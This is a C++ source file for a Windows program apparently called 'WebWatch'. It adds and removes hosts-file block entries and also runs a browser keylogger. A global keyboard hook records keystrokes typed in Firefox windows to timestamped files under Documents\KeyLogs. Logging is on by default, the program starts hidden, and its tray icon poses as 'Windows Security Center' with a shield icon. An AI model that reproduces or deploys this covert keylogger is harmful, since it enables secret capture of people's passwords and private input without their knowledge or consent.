#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <Shlobj.h>
#include <ctime>
#include <locale>
#include <codecvt>
#include <cstring>
#include <winuser.h>
#include <shellapi.h>
#include <chrono>
#include <wbemcli.h>
#include <comutil.h>

HWND hwndBlockButton;
HWND hwndUnblockButton;
HWND hwndDomainInput;
HWND hwndIpAddressInput;
HWND hwndInternetAccess;
std::ofstream logFile;

NOTIFYICONDATA nid;
bool browserKeyLogging = true;

bool AddHostEntry(const std::string &domain, const std::string &ipAddress) {
    std::ofstream hostsFile(R"(C:\Windows\System32\drivers\etc\hosts)", std::ios_base::app);
    if (hostsFile.is_open()) {
        hostsFile << ipAddress << " " << domain << std::endl;
        hostsFile.close();
        return true;
    }
    return false;
}

bool RemoveHostEntry(const std::string &domain, const std::string &ipAddress) {
    std::ifstream input(R"(C:\Windows\System32\drivers\etc\hosts)");
    std::ofstream output(R"(C:\Windows\System32\drivers\etc\hosts_temp)");

    if (input.is_open() && output.is_open()) {
        std::string line;
        while (std::getline(input, line)) {
            if (line.find(ipAddress + " " + domain) == std::string::npos) {
                output << line << std::endl;
            }
        }

        input.close();
        output.close();

        std::remove(R"(C:\Windows\System32\drivers\etc\hosts)");
        std::rename(R"(C:\Windows\System32\drivers\etc\hosts_temp)", R"(C:\Windows\System32\drivers\etc\hosts)");

        return true;
    }

    return false;
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        auto *pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        DWORD vkCode = pKeyboardStruct->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

            HWND hwndForeground = GetForegroundWindow();


            char windowTitle[256];
            GetWindowTextA(hwndForeground, windowTitle, sizeof(windowTitle));

            const auto title = std::string(windowTitle);
            const auto fireandfox = std::string("Firefox");


            if (title.contains(fireandfox) && browserKeyLogging) {

                logFile << vkCode << " ";
            }
        }
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            CreateWindow("STATIC", "WebWatch welcomes you.", WS_VISIBLE | WS_CHILD, 10, 5, 360, 20, hwnd, nullptr,
                         nullptr, nullptr);

            CreateWindow("STATIC", "Enter the domain and IP address to block / unblock:", WS_VISIBLE | WS_CHILD, 10, 35,
                         360, 20, hwnd, nullptr, nullptr, nullptr);

            hwndDomainInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 10, 65, 200, 30, hwnd,
                                           nullptr, nullptr, nullptr);

            hwndIpAddressInput = CreateWindow("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER, 10, 105, 200, 30, hwnd,
                                              nullptr, nullptr, nullptr);

            hwndBlockButton = CreateWindow("BUTTON", "Block", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 10, 145, 150, 30,
                                           hwnd, nullptr, nullptr, nullptr);

            hwndUnblockButton = CreateWindow("BUTTON", "Unblock", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON, 170, 145, 150,
                                             30, hwnd, nullptr, nullptr, nullptr);

            CreateWindow("STATIC", "Activate / Deactivate browser keylogging.", WS_VISIBLE | WS_CHILD, 10, 195, 360, 20,
                         hwnd, nullptr, nullptr, nullptr);

            hwndInternetAccess = CreateWindow("BUTTON", "Activate / Deactivate", WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                              10, 225, 150, 30, hwnd, nullptr, nullptr, nullptr);

            auto hInstance = reinterpret_cast<HINSTANCE>(GetWindowLongPtr(hwnd, GWLP_HINSTANCE));


            ZeroMemory(&nid, sizeof(NOTIFYICONDATA));
            nid.cbSize = sizeof(NOTIFYICONDATA);
            nid.hWnd = hwnd;
            nid.uID = 1;
            nid.uFlags = NIF_ICON | NIF_TIP | NIF_MESSAGE;
            nid.uCallbackMessage = WM_APP;
            nid.hIcon = LoadIcon(nullptr, IDI_SHIELD);
            strcpy(nid.szTip, "Windows Security Center");
            Shell_NotifyIcon(NIM_ADD, &nid);


            HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, hInstance, 0);
            if (hKeyboardHook == nullptr) {
                MessageBox(hwnd, "Failed to install the keyboard hook.", "Error", MB_OK | MB_ICONERROR);
            } else {

                SetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(hKeyboardHook));
            }


            PWSTR documentsPath;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath))) {
                std::wstring keyLogsFolder = std::wstring(documentsPath) + L"\\KeyLogs";
                CreateDirectory(reinterpret_cast<LPCSTR>(keyLogsFolder.c_str()), nullptr);


                std::time_t now = std::time(nullptr);
                std::tm *timeInfo = std::localtime(&now);
                char timestamp[20];
                std::strftime(timestamp, sizeof(timestamp), "%Y%m%d%H%M%S", timeInfo);

                std::string logFileName = "LOG_" + std::string(timestamp) + ".txt";

                std::wstring logFilePath = keyLogsFolder + L"\\" + std::wstring(logFileName.begin(), logFileName.end());

                std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
                std::string logFilePathUtf8 = converter.to_bytes(logFilePath);

                logFile.open(logFilePathUtf8, std::ios_base::app);

                CoTaskMemFree(documentsPath);
            }
        }
            break;

        case WM_APP: {
            switch (LOWORD(lParam)) {
                case WM_LBUTTONDBLCLK: {
                    ShowWindow(hwnd, SW_RESTORE);
                    SetForegroundWindow(hwnd);
                    break;
                }
            }
            break;
        }

        case WM_COMMAND: {
            if (reinterpret_cast<HWND>(lParam) == hwndBlockButton) {

                const int bufferSize = 256;
                wchar_t domainBuffer[bufferSize];
                wchar_t ipAddressBuffer[bufferSize];

                GetWindowTextW(hwndDomainInput, domainBuffer, bufferSize);
                GetWindowTextW(hwndIpAddressInput, ipAddressBuffer, bufferSize);

                std::wstring domain(domainBuffer);
                std::wstring ipAddress(ipAddressBuffer);

                std::string domainUtf8(domain.begin(), domain.end());
                std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());

                if (AddHostEntry(domainUtf8, ipAddressUtf8)) {
                    MessageBox(hwnd, "Host entry added successfully.", "Success", MB_OK | MB_ICONINFORMATION);
                } else {
                    MessageBox(hwnd, "Failed to add the host entry.", "Error", MB_OK | MB_ICONERROR);
                }
            } else if (reinterpret_cast<HWND>(lParam) == hwndUnblockButton) {

                const int bufferSize = 256;
                wchar_t domainBuffer[bufferSize];
                wchar_t ipAddressBuffer[bufferSize];

                GetWindowTextW(hwndDomainInput, domainBuffer, bufferSize);
                GetWindowTextW(hwndIpAddressInput, ipAddressBuffer, bufferSize);

                std::wstring domain(domainBuffer);
                std::wstring ipAddress(ipAddressBuffer);

                std::string domainUtf8(domain.begin(), domain.end());
                std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());

                if (RemoveHostEntry(domainUtf8, ipAddressUtf8)) {
                    MessageBox(hwnd, "Host entry removed successfully.", "Success", MB_OK | MB_ICONINFORMATION);
                } else {
                    MessageBox(hwnd, "Failed to remove the host entry.", "Error", MB_OK | MB_ICONERROR);
                }
            } else if (reinterpret_cast<HWND>(lParam) == hwndInternetAccess) {
                auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
                std::tm currentTime{};
                localtime_s(&currentTime, &now);


                if (!browserKeyLogging) {
                    MessageBox(hwnd, "Browser Keylogging enabled.", "Success", MB_OK | MB_ICONINFORMATION);
                    browserKeyLogging = true;
                } else {
                    MessageBox(hwnd, "Browser Keylogging disabled.", "Success", MB_OK | MB_ICONINFORMATION);
                    browserKeyLogging = false;
                }
            } else if ((reinterpret_cast<HWND>(lParam) == nullptr) && (LOWORD(wParam) == 1)) {

                switch (HIWORD(wParam)) {
                    case WM_LBUTTONUP:
                    case WM_RBUTTONUP: {
                        POINT pt;
                        GetCursorPos(&pt);

                        HMENU hMenu = CreatePopupMenu();
                        AppendMenu(hMenu, MF_STRING, 1, "Exit");

                        SetForegroundWindow(hwnd);
                        TrackPopupMenu(hMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, nullptr);
                        DestroyMenu(hMenu);

                        break;
                    }
                }
            } else if (HIWORD(wParam) == 0 && LOWORD(wParam) == 1) {
                PostMessage(hwnd, WM_CLOSE, 0, 0);
            }
            break;
        }

        case WM_CLOSE: {

            auto hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
            if (hKeyboardHook != nullptr) {
                UnhookWindowsHookEx(hKeyboardHook);
            }

            logFile.close();

            DestroyWindow(hwnd);
            break;
        }

        case WM_DESTROY: {
            Shell_NotifyIcon(NIM_DELETE, &nid);
            PostQuitMessage(0);
            break;
        }

        case WM_SYSCOMMAND: {
            if (wParam == SC_MINIMIZE) {
                ShowWindow(hwnd, SW_HIDE);
                return 0;
            } else if (wParam == SC_CLOSE) {
                auto hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
                if (hKeyboardHook != nullptr) {
                    UnhookWindowsHookEx(hKeyboardHook);
                }

                logFile.close();

                DestroyWindow(hwnd);
            }
            break;
        }
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const wchar_t CLASS_NAME[] = L"WebWatch";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = reinterpret_cast<LPCSTR>(CLASS_NAME);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, reinterpret_cast<LPCSTR>(CLASS_NAME), reinterpret_cast<LPCSTR>(L"WebWatch"),
                               WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, nullptr, nullptr, hInstance,
                               nullptr);

    if (hwnd == nullptr) {
        return 0;
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    RECT rect;
    GetWindowRect(hwnd, &rect);
    int windowWidth = rect.right - rect.left;
    int windowHeight = rect.bottom - rect.top;

    int posX = (screenWidth - windowWidth) / 2;
    int posY = (screenHeight - windowHeight) / 2;

    SetWindowPos(hwnd, nullptr, posX, posY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

    //START UNTRAYED, COMMENT SW_HIDE
    //ShowWindow(hwnd, nCmdShow);
    ShowWindow(hwnd, SW_HIDE);

    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}